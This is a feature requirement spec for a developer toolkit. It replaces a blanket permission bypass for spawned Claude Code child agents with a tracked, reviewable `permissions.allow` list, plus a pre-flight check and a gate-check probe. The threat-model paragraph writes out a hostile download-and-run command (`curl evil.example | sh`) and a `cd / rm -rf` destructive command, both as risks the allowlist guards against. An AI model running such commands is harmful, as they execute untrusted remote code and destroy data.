# STE-252: Replace bypassPermissions with tracked permissions.allow in /conformance-loop call-tree {#STE-252}

## Requirement

`/conformance-loop` and the `/smoke-test` Phase 2 children it reaches (`/spec-review`, `/simplify`, `/gate-check`, `/spec-write`, `/implement`) currently spawn every `claude -p` child with `--permission-mode bypassPermissions`. This is a blanket bypass with no audit-able policy artifact — the operator cannot review the effective permission policy in a PR diff because none exists. STE-185's threat-model rationale already names `.claude/settings.json` as the parent-prepared artifact constraining child blast radius, but the artifact's role is implicit (constraint by *presence*) rather than explicit (constraint by *content*).

This FR promotes the constraint to explicit: the tracked `.claude/settings.json` carries a `permissions.allow` block enumerating every tool surface the call tree needs, and `--permission-mode bypassPermissions` is dropped at every spawn site reachable from `/conformance-loop`. Operators review the policy in PR diffs; children run in default permission mode and honor the tracked allowlist; the loop stays hands-off because the allowlist covers the children's needs.

Both `/conformance-loop` and `/smoke-test` are project-local (`.claude/skills/`), so this is repo-scoped — no published-toolkit-skill change.

## Acceptance Criteria

- AC-STE-252.1: Tracked `.claude/settings.json` carries a `permissions.allow` block with deterministic ordering, covering Bash command patterns, Edit/Write/Read/Grep/Glob, and MCP tool families (`mcp__linear__*`, `mcp__atlassian__*`) used by the `/conformance-loop` call tree. The block is byte-stable across runs and reviewable as a single-file PR diff.
- AC-STE-252.2: `--permission-mode bypassPermissions` is removed from every `claude -p` spawn snippet in `.claude/skills/conformance-loop/SKILL.md` (~5 sites: Phase A `/smoke-test` pair + Phase B `/spec-write` + `/implement`) and `.claude/skills/smoke-test/SKILL.md` (~8 sites: STE-185/188 Phase 2 children + the L949 spawn). Default-mode spawns rely on the tracked allowlist.
- AC-STE-252.3: `/conformance-loop` Phase 0 adds a pre-flight step that reads `.claude/settings.json`, JSON-parses it, and asserts `.permissions.allow` is a non-empty array. Miss → NFR-10 canonical refusal naming file + remedy. Hit → log `permissions_allow_present` and proceed.
- AC-STE-252.4: New `/gate-check` probe `conformance-loop-bypass-removed` (severity: error) globs `.claude/skills/{conformance-loop,smoke-test}/SKILL.md`, finds every fenced `bash` block containing `claude -p `, and asserts none carry `--permission-mode bypassPermissions`. Vacuous on repos without those files. Test coverage: `tests/gate-check-conformance-loop-bypass-removed.test.ts`.
- AC-STE-252.5: End-to-end empirical validation — `/conformance-loop --max-iterations 1 --linear-team STE` runs against `dpt-test-project-linear` without halting at any permission prompt. Validates allowlist coverage of actual call-tree tool usage. Deferred-acceptance per `feedback_smoke_post_ship_retroactive` if a follow-up smoke surfaces gaps.
- AC-STE-252.6: Threat-model prose in `/smoke-test` (the "Threat model" section near L1024) and the "Path-safety guard delegated to children" paragraph in `/conformance-loop` (near L171) update to the new posture: tracked `permissions.allow` provides per-tool-call enforcement; the realpath cwd allow-list (`/smoke-test` pre-flight #6) stays but no longer "justifies bypassPermissions".

## Technical Design

**Mechanism.** Claude Code merges `.claude/settings.json` + `.claude/settings.local.json` and reads `permissions.allow` from the spawn cwd. Pattern shapes: `Bash(<glob>)`, `Edit`, `Write`, `Read`, `Grep`, `Glob`, `mcp__<server>__<tool>`. Surface match → no prompt; non-match under `claude -p` → structured refusal.

**Artifact location.** The allowlist lands in **tracked** `.claude/settings.json` (currently `{"enabledPlugins":{}}`), not `.claude/settings.local.json` (gitignored, operator-specific). The tracked file is the audit-able artifact; merging preserves the operator's local overrides.

**Allowlist content (initial).** Curated by walking the call tree. Bash: `bun:*`, `bun test:*`, `git:*`, `gh:*`, `find:*`, `realpath:*`, `mkdir:*`, `rm:*`, `cat:*`, `wc:*`, `wait`, `kill`, `cp:*`, `ls:*`, `tee:*`. File tools: `Edit`, `Write`, `Read`, `Grep`, `Glob` (no path narrowing — the realpath pre-flight already scopes cwd). MCP: `mcp__linear__*`, `mcp__atlassian__*`. Allowlist is hand-curated; AC-STE-252.5 validates coverage; missing patterns surface as iter-N halts and are added incrementally.

**Spawn-snippet edit.** Mechanical removal of `--permission-mode bypassPermissions \` and its continuation backslash from each fenced `bash` block. No replacement flag — absence means default mode.

**Phase 0 pre-flight (AC-STE-252.3).** New step before any `claude -p` call: `jq -e '.permissions.allow | length > 0' .claude/settings.json`-equivalent check. On failure, NFR-10 refusal: `Refused: permissions.allow empty or missing in .claude/settings.json. Remedy: populate the allow-list. Context: skill=conformance-loop pre-flight=permissions_allow_check`. Modeled on `/gate-check` probe #38 shape.

**Gate-check probe (AC-STE-252.4).** New probe `conformance-loop-bypass-removed` added to `/gate-check` skill body. Globs the two project-local SKILL.md files, asserts no fenced `bash` block with `claude -p ` contains `--permission-mode bypassPermissions`. Vacuous on toolkit consumers without those files. Test mirrors `tests/gate-check-auto-approve-marker.test.ts` shape.

**Threat-model rewrite (AC-STE-252.6).** Residual risk under the new posture: the allowlist only permits what's listed, so buggy children cannot escape into `Bash(curl evil.example | sh)` unless that pattern is in the file. The "compromised plugin skill" risk shrinks to "the plugin under test exercises the allowlist's scope but cannot exceed it". The "child cd / rm -rf" risk is bounded by the realpath pre-flight (cwd-scoped) plus the absence of broad destructive patterns from the allowlist.

**STE-185 falsification reconsidered.** STE-185 documented that `acceptEdits + per-path Write` and "plain bypassPermissions without parent pre-creation" both empirically failed. The new design is neither: it's `default-mode + content-rich permissions.allow` covering Bash + Edit + Write + MCP at command-pattern granularity, not just per-path file writes. AC-STE-252.5 is the empirical-validation gate.
